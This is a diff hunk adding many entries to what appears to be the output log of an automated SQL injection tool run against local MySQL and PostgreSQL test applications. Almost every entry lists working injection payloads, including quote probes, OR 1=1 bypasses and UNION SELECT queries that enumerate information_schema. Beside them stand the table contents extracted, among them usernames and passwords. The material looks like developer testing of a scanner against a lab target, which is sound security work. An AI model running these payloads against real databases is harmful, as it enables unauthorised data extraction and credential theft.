@@ -14125,3 +14125,809 @@ Test URL : http://localhost:3000/mysql/users?user=1
     " UNION SELECT null, CONCAT(id, ', ', username, ', ', password, ', ', description), null FROM users -- "
   ]
 }
+
+
+
+Test URL : http://localhost:3000/postgres
+"Request type: GET"
+
+
+
+Test URL : http://localhost:3000/postgres/users?user=1
+"Request type: GET"
+{
+  "dbEngine": "postgresql",
+  "dbName": "testdb",
+  "table": [
+    "users",
+    "test_db"
+  ],
+  "columns": [
+    {
+      "tableName": "users",
+      "columns": [
+        "id",
+        "description",
+        "password",
+        "username"
+      ],
+      "data": [
+        "2, user descption here, user, user",
+        "1, description admin blabla, admin, admin"
+      ]
+    },
+    {
+      "tableName": "test_db",
+      "columns": [
+        "blabla",
+        "id",
+        "blibli"
+      ],
+      "data": [
+        "123, 1, 456"
+      ]
+    }
+  ],
+  "nbColumns": 2,
+  "rows": [],
+  "vulnerableParameters": [
+    {
+      "user": "1"
+    }
+  ],
+  "payloadsUsed": [
+    "'",
+    " UNION SELECT null, null, current_database() -- ",
+    " UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema = 'public' --  ",
+    " UNION SELECT null, null, column_name FROM information_schema.columns WHERE table_name = 'users' -- ",
+    " UNION SELECT null, null, column_name FROM information_schema.columns WHERE table_name = 'test_db' -- ",
+    " UNION SELECT CONCAT(CAST(id AS text), ', ', CAST(description AS text), ', ', CAST(password AS text), ', ', CAST(username AS text)) FROM users -- ",
+    " UNION SELECT null, CONCAT(CAST(id AS text), ', ', CAST(description AS text), ', ', CAST(password AS text), ', ', CAST(username AS text)), null FROM users -- ",
+    " UNION SELECT CONCAT(CAST(blabla AS text), ', ', CAST(id AS text), ', ', CAST(blibli AS text)) FROM test_db -- ",
+    " UNION SELECT null, CONCAT(CAST(blabla AS text), ', ', CAST(id AS text), ', ', CAST(blibli AS text)), null FROM test_db -- "
+  ]
+}
+
+
+
+Test URL : http://localhost:3000/postgres/users?user=2
+"Request type: GET"
+{
+  "dbEngine": "postgresql",
+  "dbName": "testdb",
+  "table": [
+    2,
+    "user",
+    "user descption here",
+    "test_db"
+  ],
+  "columns": [
+    {
+      "tableName": 2,
+      "columns": [],
+      "data": []
+    },
+    {
+      "tableName": "user",
+      "columns": [],
+      "data": []
+    },
+    {
+      "tableName": "user descption here",
+      "columns": [],
+      "data": []
+    },
+    {
+      "tableName": "test_db",
+      "columns": [
+        "blibli",
+        "blabla",
+        "id"
+      ],
+      "data": [
+        "456, 123, 1"
+      ]
+    }
+  ],
+  "nbColumns": 2,
+  "rows": [],
+  "vulnerableParameters": [
+    {
+      "user": "2"
+    }
+  ],
+  "payloadsUsed": [
+    "'",
+    " UNION SELECT null, null, current_database() -- ",
+    " UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema = 'public' --  ",
+    " UNION SELECT null, null, column_name FROM information_schema.columns WHERE table_name = '2' -- ",
+    " UNION SELECT null, null, column_name FROM information_schema.columns WHERE table_name = 'user' -- ",
+    " UNION SELECT null, null, column_name FROM information_schema.columns WHERE table_name = 'user descption here' -- ",
+    " UNION SELECT null, null, column_name FROM information_schema.columns WHERE table_name = 'test_db' -- ",
+    " UNION SELECT CONCAT() FROM 2 -- ",
+    " UNION SELECT null, CONCAT(), null FROM 2 -- ",
+    " UNION SELECT CONCAT() FROM user -- ",
+    " UNION SELECT null, CONCAT(), null FROM user -- ",
+    " UNION SELECT CONCAT() FROM user descption here -- ",
+    " UNION SELECT null, CONCAT(), null FROM user descption here -- ",
+    " UNION SELECT CONCAT(CAST(blibli AS text), ', ', CAST(blabla AS text), ', ', CAST(id AS text)) FROM test_db -- ",
+    " UNION SELECT null, CONCAT(CAST(blibli AS text), ', ', CAST(blabla AS text), ', ', CAST(id AS text)), null FROM test_db -- "
+  ]
+}
+
+
+
+Test URL : http://localhost:3000/mysql/users?user=1
+"Request type: GET"
+{
+  "dbEngine": "",
+  "dbName": "",
+  "table": [],
+  "columns": [],
+  "nbColumns": 0,
+  "rows": [],
+  "vulnerableParameters": [
+    {
+      "user": "1"
+    }
+  ],
+  "payloadsUsed": [
+    "'"
+  ]
+}
+
+
+
+Test URL : http://localhost:3000/mysql/users?user=1
+"Request type: GET"
+{
+  "dbEngine": "mysql",
+  "dbName": "testdb",
+  "table": [
+    "table_test",
+    "users"
+  ],
+  "columns": [
+    {
+      "tableName": "table_test",
+      "columns": [
+        "id",
+        "somethingtruc"
+      ],
+      "data": [
+        "1, 123",
+        "2, 456",
+        "3, 789"
+      ]
+    },
+    {
+      "tableName": "users",
+      "columns": [
+        "id",
+        "username",
+        "password",
+        "description"
+      ],
+      "data": [
+        "1, admin, admin, je suis admin",
+        "2, user, user, je suis un user",
+        "3, nonx, nonx, je suis nonx"
+      ]
+    }
+  ],
+  "nbColumns": 2,
+  "rows": [],
+  "vulnerableParameters": [
+    {
+      "user": "1"
+    }
+  ],
+  "payloadsUsed": [
+    "'",
+    " UNION SELECT null, null, database() -- ",
+    " UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema = 'testdb' -- ",
+    " UNION SELECT null, null, column_name FROM information_schema.columns WHERE table_name = 'table_test' -- ",
+    " UNION SELECT null, null, column_name FROM information_schema.columns WHERE table_name = 'users' -- ",
+    " UNION SELECT CONCAT(id, ', ', somethingtruc) FROM table_test -- ",
+    " UNION SELECT null, CONCAT(id, ', ', somethingtruc), null FROM table_test -- ",
+    " UNION SELECT CONCAT(id, ', ', username, ', ', password, ', ', description) FROM users -- ",
+    " UNION SELECT null, CONCAT(id, ', ', username, ', ', password, ', ', description), null FROM users -- "
+  ]
+}
+
+
+
+Test URL : http://localhost:3000/postgres
+"Request type: POST"
+{
+  "dbEngine": "postgresql",
+  "dbName": "testdb",
+  "table": [
+    "users",
+    "test_db"
+  ],
+  "columns": [
+    {
+      "tableName": "users",
+      "columns": [
+        "id",
+        "description",
+        "password",
+        "username"
+      ],
+      "data": [
+        "2, user descption here, user, user",
+        "1, description admin blabla, admin, admin"
+      ]
+    },
+    {
+      "tableName": "test_db",
+      "columns": [
+        "blabla",
+        "id",
+        "blibli"
+      ],
+      "data": [
+        "123, 1, 456"
+      ]
+    }
+  ],
+  "nbColumns": 3,
+  "rows": [],
+  "vulnerableParameters": [
+    {
+      "field": "username"
+    }
+  ],
+  "payloadsUsed": [
+    "' OR 1=1 --'",
+    "' UNION SELECT null, null, null, current_database() -- '",
+    "' UNION SELECT null, null, null, table_name FROM information_schema.tables WHERE table_schema = 'public' -- ' ",
+    "' UNION SELECT null, null, null, column_name FROM information_schema.columns WHERE table_name = 'users' -- '",
+    "' UNION SELECT null, null, null, column_name FROM information_schema.columns WHERE table_name = 'test_db' -- '",
+    "' UNION SELECT null, null, CONCAT(CAST(id AS text), ', ', CAST(description AS text), ', ', CAST(password AS text), ', ', CAST(username AS text)), null FROM users -- ",
+    "' UNION SELECT null, null, CONCAT(CAST(blabla AS text), ', ', CAST(id AS text), ', ', CAST(blibli AS text)), null FROM test_db -- "
+  ]
+}
+
+
+
+Test URL : http://localhost:3000/mysql/users
+"Request type: POST"
+
+
+
+Test URL : http://localhost:3000/postgres/users
+"Request type: POST"
+
+
+
+Test URL : http://localhost:3000/postgres
+"Request type: POST"
+{
+  "dbEngine": "postgresql",
+  "dbName": "testdb",
+  "table": [
+    "users",
+    "test_db"
+  ],
+  "columns": [
+    {
+      "tableName": "users",
+      "columns": [
+        "id",
+        "description",
+        "password",
+        "username"
+      ],
+      "data": [
+        "2, user descption here, user, user",
+        "1, description admin blabla, admin, admin"
+      ]
+    },
+    {
+      "tableName": "test_db",
+      "columns": [
+        "blabla",
+        "id",
+        "blibli"
+      ],
+      "data": [
+        "123, 1, 456"
+      ]
+    }
+  ],
+  "nbColumns": 3,
+  "rows": [],
+  "vulnerableParameters": [
+    {
+      "field": "username"
+    }
+  ],
+  "payloadsUsed": [
+    "' OR 1=1 --'",
+    "' UNION SELECT null, null, null, current_database() -- '",
+    "' UNION SELECT null, null, null, table_name FROM information_schema.tables WHERE table_schema = 'public' -- ' ",
+    "' UNION SELECT null, null, null, column_name FROM information_schema.columns WHERE table_name = 'users' -- '",
+    "' UNION SELECT null, null, null, column_name FROM information_schema.columns WHERE table_name = 'test_db' -- '",
+    "' UNION SELECT null, null, CONCAT(CAST(id AS text), ', ', CAST(description AS text), ', ', CAST(password AS text), ', ', CAST(username AS text)), null FROM users -- ",
+    "' UNION SELECT null, null, CONCAT(CAST(blabla AS text), ', ', CAST(id AS text), ', ', CAST(blibli AS text)), null FROM test_db -- "
+  ]
+}
+
+
+
+Test URL : http://localhost:3000/mysql
+"Request type: POST"
+{
+  "dbEngine": "mysql",
+  "dbName": "testdb",
+  "table": [
+    "table_test",
+    "users"
+  ],
+  "columns": [
+    {
+      "tableName": "table_test",
+      "columns": [
+        "id",
+        "somethingtruc"
+      ],
+      "data": [
+        "1, 123",
+        "2, 456",
+        "3, 789"
+      ]
+    },
+    {
+      "tableName": "users",
+      "columns": [
+        "id",
+        "username",
+        "password",
+        "description"
+      ],
+      "data": [
+        "1, admin, admin, je suis admin",
+        "2, user, user, je suis un user",
+        "3, nonx, nonx, je suis nonx"
+      ]
+    }
+  ],
+  "nbColumns": 3,
+  "rows": [],
+  "vulnerableParameters": [
+    {
+      "field": "username"
+    }
+  ],
+  "payloadsUsed": [
+    "' OR 1=1 --'",
+    "' UNION SELECT null, null, null, database() -- '",
+    "' UNION SELECT null, null, null, table_name FROM information_schema.tables WHERE table_schema = 'testdb' -- ' ",
+    "' UNION SELECT null, null, null, column_name FROM information_schema.columns WHERE table_name = 'table_test' -- '",
+    "' UNION SELECT null, null, null, column_name FROM information_schema.columns WHERE table_name = 'users' -- '",
+    "' UNION SELECT null, null, CONCAT(id, ', ', somethingtruc), null FROM table_test -- ",
+    "' UNION SELECT null, null, CONCAT(id, ', ', username, ', ', password, ', ', description), null FROM users -- "
+  ]
+}
+
+
+
+Test URL : http://localhost:3000/postgres/users?user=1
+"Request type: GET"
+{
+  "dbEngine": "postgresql",
+  "dbName": "testdb",
+  "tableData": [],
+  "table": [
+    "users",
+    "test_db"
+  ],
+  "columns": [
+    {
+      "tableName": "users",
+      "columns": [
+        "id",
+        "description",
+        "password",
+        "username"
+      ],
+      "nbColumns": 4,
+      "data": [
+        "2, user descption here, user, user",
+        "1, description admin blabla, admin, admin"
+      ],
+      "nbRows": 0
+    },
+    {
+      "tableName": "test_db",
+      "columns": [
+        "blabla",
+        "id",
+        "blibli"
+      ],
+      "nbColumns": 3,
+      "data": [
+        "123, 1, 456"
+      ],
+      "nbRows": 0
+    }
+  ],
+  "vulnerableParameters": [
+    {
+      "user": "1"
+    }
+  ],
+  "payloadsUsed": [
+    "'",
+    " UNION SELECT null, null, current_database() -- ",
+    " UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema = 'public' --  ",
+    " UNION SELECT null, null, column_name FROM information_schema.columns WHERE table_name = 'users' -- ",
+    " UNION SELECT null, null, column_name FROM information_schema.columns WHERE table_name = 'test_db' -- ",
+    " UNION SELECT CONCAT(CAST(id AS text), ', ', CAST(description AS text), ', ', CAST(password AS text), ', ', CAST(username AS text)) FROM users -- ",
+    " UNION SELECT null, CONCAT(CAST(id AS text), ', ', CAST(description AS text), ', ', CAST(password AS text), ', ', CAST(username AS text)), null FROM users -- ",
+    " UNION SELECT CONCAT(CAST(blabla AS text), ', ', CAST(id AS text), ', ', CAST(blibli AS text)) FROM test_db -- ",
+    " UNION SELECT null, CONCAT(CAST(blabla AS text), ', ', CAST(id AS text), ', ', CAST(blibli AS text)), null FROM test_db -- "
+  ],
+  "nbColumns": 2
+}
+
+
+
+Test URL : http://localhost:3000/postgres/users?user=1
+"Request type: GET"
+
+
+
+Test URL : http://localhost:3000/postgres/users?user=1
+"Request type: GET"
+{
+  "dbEngine": "postgresql",
+  "dbName": "testdb",
+  "tableData": [],
+  "table": [
+    "users",
+    "test_db"
+  ],
+  "columns": [
+    {
+      "tableName": "users",
+      "columns": [
+        "id",
+        "description",
+        "password",
+        "username"
+      ],
+      "nbColumns": 4,
+      "data": [
+        "2, user descption here, user, user",
+        "1, description admin blabla, admin, admin"
+      ],
+      "nbRows": 2
+    },
+    {
+      "tableName": "test_db",
+      "columns": [
+        "blabla",
+        "id",
+        "blibli"
+      ],
+      "nbColumns": 3,
+      "data": [
+        "123, 1, 456"
+      ],
+      "nbRows": 1
+    }
+  ],
+  "vulnerableParameters": [
+    {
+      "user": "1"
+    }
+  ],
+  "payloadsUsed": [
+    "'",
+    " UNION SELECT null, null, current_database() -- ",
+    " UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema = 'public' --  ",
+    " UNION SELECT null, null, column_name FROM information_schema.columns WHERE table_name = 'users' -- ",
+    " UNION SELECT null, null, column_name FROM information_schema.columns WHERE table_name = 'test_db' -- ",
+    " UNION SELECT CONCAT(CAST(id AS text), ', ', CAST(description AS text), ', ', CAST(password AS text), ', ', CAST(username AS text)) FROM users -- ",
+    " UNION SELECT null, CONCAT(CAST(id AS text), ', ', CAST(description AS text), ', ', CAST(password AS text), ', ', CAST(username AS text)), null FROM users -- ",
+    " UNION SELECT CONCAT(CAST(blabla AS text), ', ', CAST(id AS text), ', ', CAST(blibli AS text)) FROM test_db -- ",
+    " UNION SELECT null, CONCAT(CAST(blabla AS text), ', ', CAST(id AS text), ', ', CAST(blibli AS text)), null FROM test_db -- "
+  ],
+  "nbColumns": 2
+}
+
+
+
+Test URL : http://localhost:3000/mysql/users?user=1
+"Request type: GET"
+{
+  "dbEngine": "mysql",
+  "dbName": "testdb",
+  "tableData": [],
+  "table": [
+    "table_test",
+    "users"
+  ],
+  "columns": [
+    {
+      "tableName": "table_test",
+      "columns": [
+        "id",
+        "somethingtruc"
+      ],
+      "nbColumns": 2,
+      "data": [
+        "1, 123",
+        "2, 456",
+        "3, 789"
+      ],
+      "nbRows": 3
+    },
+    {
+      "tableName": "users",
+      "columns": [
+        "id",
+        "username",
+        "password",
+        "description"
+      ],
+      "nbColumns": 4,
+      "data": [
+        "1, admin, admin, je suis admin",
+        "2, user, user, je suis un user",
+        "3, nonx, nonx, je suis nonx"
+      ],
+      "nbRows": 3
+    }
+  ],
+  "vulnerableParameters": [
+    {
+      "user": "1"
+    }
+  ],
+  "payloadsUsed": [
+    "'",
+    " UNION SELECT null, null, database() -- ",
+    " UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema = 'testdb' -- ",
+    " UNION SELECT null, null, column_name FROM information_schema.columns WHERE table_name = 'table_test' -- ",
+    " UNION SELECT null, null, column_name FROM information_schema.columns WHERE table_name = 'users' -- ",
+    " UNION SELECT CONCAT(id, ', ', somethingtruc) FROM table_test -- ",
+    " UNION SELECT null, CONCAT(id, ', ', somethingtruc), null FROM table_test -- ",
+    " UNION SELECT CONCAT(id, ', ', username, ', ', password, ', ', description) FROM users -- ",
+    " UNION SELECT null, CONCAT(id, ', ', username, ', ', password, ', ', description), null FROM users -- "
+  ],
+  "nbColumns": 2
+}
+
+
+
+Test URL : http://localhost:3000/postgres
+"Request type: POST"
+{
+  "dbEngine": "postgresql",
+  "dbName": "testdb",
+  "tableData": [],
+  "table": [
+    "users",
+    "test_db"
+  ],
+  "columns": [
+    {
+      "tableName": "users",
+      "columns": [
+        "id",
+        "description",
+        "password",
+        "username"
+      ],
+      "data": [
+        "2, user descption here, user, user",
+        "1, description admin blabla, admin, admin"
+      ]
+    },
+    {
+      "tableName": "test_db",
+      "columns": [
+        "blabla",
+        "id",
+        "blibli"
+      ],
+      "data": [
+        "123, 1, 456"
+      ]
+    }
+  ],
+  "vulnerableParameters": [
+    {
+      "field": "username"
+    }
+  ],
+  "payloadsUsed": [
+    "' OR 1=1 --'",
+    "' UNION SELECT null, null, null, current_database() -- '",
+    "' UNION SELECT null, null, null, table_name FROM information_schema.tables WHERE table_schema = 'public' -- ' ",
+    "' UNION SELECT null, null, null, column_name FROM information_schema.columns WHERE table_name = 'users' -- '",
+    "' UNION SELECT null, null, null, column_name FROM information_schema.columns WHERE table_name = 'test_db' -- '",
+    "' UNION SELECT null, null, CONCAT(CAST(id AS text), ', ', CAST(description AS text), ', ', CAST(password AS text), ', ', CAST(username AS text)), null FROM users -- ",
+    "' UNION SELECT null, null, CONCAT(CAST(blabla AS text), ', ', CAST(id AS text), ', ', CAST(blibli AS text)), null FROM test_db -- "
+  ]
+}
+
+
+
+Test URL : http://localhost:3000/postgres/users?user=1
+"Request type: GET"
+{
+  "dbEngine": "postgresql",
+  "dbName": "testdb",
+  "tableData": [],
+  "table": [
+    "users",
+    "test_db"
+  ],
+  "columns": [
+    {
+      "tableName": "users",
+      "columns": [
+        "id",
+        "description",
+        "password",
+        "username"
+      ],
+      "nbColumns": 4,
+      "data": [
+        "2, user descption here, user, user",
+        "1, description admin blabla, admin, admin"
+      ],
+      "nbRows": 2
+    },
+    {
+      "tableName": "test_db",
+      "columns": [
+        "blabla",
+        "id",
+        "blibli"
+      ],
+      "nbColumns": 3,
+      "data": [
+        "123, 1, 456"
+      ],
+      "nbRows": 1
+    }
+  ],
+  "vulnerableParameters": [
+    {
+      "user": "1"
+    }
+  ],
+  "payloadsUsed": [
+    "'",
+    " UNION SELECT null, null, current_database() -- ",
+    " UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema = 'public' --  ",
+    " UNION SELECT null, null, column_name FROM information_schema.columns WHERE table_name = 'users' -- ",
+    " UNION SELECT null, null, column_name FROM information_schema.columns WHERE table_name = 'test_db' -- ",
+    " UNION SELECT CONCAT(CAST(id AS text), ', ', CAST(description AS text), ', ', CAST(password AS text), ', ', CAST(username AS text)) FROM users -- ",
+    " UNION SELECT null, CONCAT(CAST(id AS text), ', ', CAST(description AS text), ', ', CAST(password AS text), ', ', CAST(username AS text)), null FROM users -- ",
+    " UNION SELECT CONCAT(CAST(blabla AS text), ', ', CAST(id AS text), ', ', CAST(blibli AS text)) FROM test_db -- ",
+    " UNION SELECT null, CONCAT(CAST(blabla AS text), ', ', CAST(id AS text), ', ', CAST(blibli AS text)), null FROM test_db -- "
+  ]
+}
+
+
+
+Test URL : http://localhost:3000/mysql/users?user=1
+"Request type: GET"
+{
+  "dbEngine": "mysql",
+  "dbName": "testdb",
+  "tableData": [],
+  "table": [
+    "table_test",
+    "users"
+  ],
+  "columns": [
+    {
+      "tableName": "table_test",
+      "columns": [
+        "id",
+        "somethingtruc"
+      ],
+      "nbColumns": 2,
+      "data": [
+        "1, 123",
+        "2, 456",
+        "3, 789"
+      ],
+      "nbRows": 3
+    },
+    {
+      "tableName": "users",
+      "columns": [
+        "id",
+        "username",
+        "password",
+        "description"
+      ],
+      "nbColumns": 4,
+      "data": [
+        "1, admin, admin, je suis admin",
+        "2, user, user, je suis un user",
+        "3, nonx, nonx, je suis nonx"
+      ],
+      "nbRows": 3
+    }
+  ],
+  "vulnerableParameters": [
+    {
+      "user": "1"
+    }
+  ],
+  "payloadsUsed": [
+    "'",
+    " UNION SELECT null, null, database() -- ",
+    " UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema = 'testdb' -- ",
+    " UNION SELECT null, null, column_name FROM information_schema.columns WHERE table_name = 'table_test' -- ",
+    " UNION SELECT null, null, column_name FROM information_schema.columns WHERE table_name = 'users' -- ",
+    " UNION SELECT CONCAT(id, ', ', somethingtruc) FROM table_test -- ",
+    " UNION SELECT null, CONCAT(id, ', ', somethingtruc), null FROM table_test -- ",
+    " UNION SELECT CONCAT(id, ', ', username, ', ', password, ', ', description) FROM users -- ",
+    " UNION SELECT null, CONCAT(id, ', ', username, ', ', password, ', ', description), null FROM users -- "
+  ]
+}
+
+
+
+Test URL : http://localhost:3000/postgres
+"Request type: POST"
+{
+  "dbEngine": "postgresql",
+  "dbName": "testdb",
+  "tableData": [],
+  "table": [
+    "users",
+    "test_db"
+  ],
+  "columns": [
+    {
+      "tableName": "users",
+      "columns": [
+        "id",
+        "description",
+        "password",
+        "username"
+      ],
+      "data": [
+        "2, user descption here, user, user",
+        "1, description admin blabla, admin, admin"
+      ]
+    },
+    {
+      "tableName": "test_db",
+      "columns": [
+        "blabla",
+        "id",
+        "blibli"
+      ],
+      "data": [
+        "123, 1, 456"
+      ]
+    }
+  ],
+  "vulnerableParameters": [
+    {
+      "field": "username"
+    }
+  ],
+  "payloadsUsed": [
+    "' OR 1=1 --'",
+    "' UNION SELECT null, null, null, current_database() -- '",
+    "' UNION SELECT null, null, null, table_name FROM information_schema.tables WHERE table_schema = 'public' -- ' ",
+    "' UNION SELECT null, null, null, column_name FROM information_schema.columns WHERE table_name = 'users' -- '",
+    "' UNION SELECT null, null, null, column_name FROM information_schema.columns WHERE table_name = 'test_db' -- '",
+    "' UNION SELECT null, null, CONCAT(CAST(id AS text), ', ', CAST(description AS text), ', ', CAST(password AS text), ', ', CAST(username AS text)), null FROM users -- ",
+    "' UNION SELECT null, null, CONCAT(CAST(blabla AS text), ', ', CAST(id AS text), ', ', CAST(blibli AS text)), null FROM test_db -- "
+  ]
+}
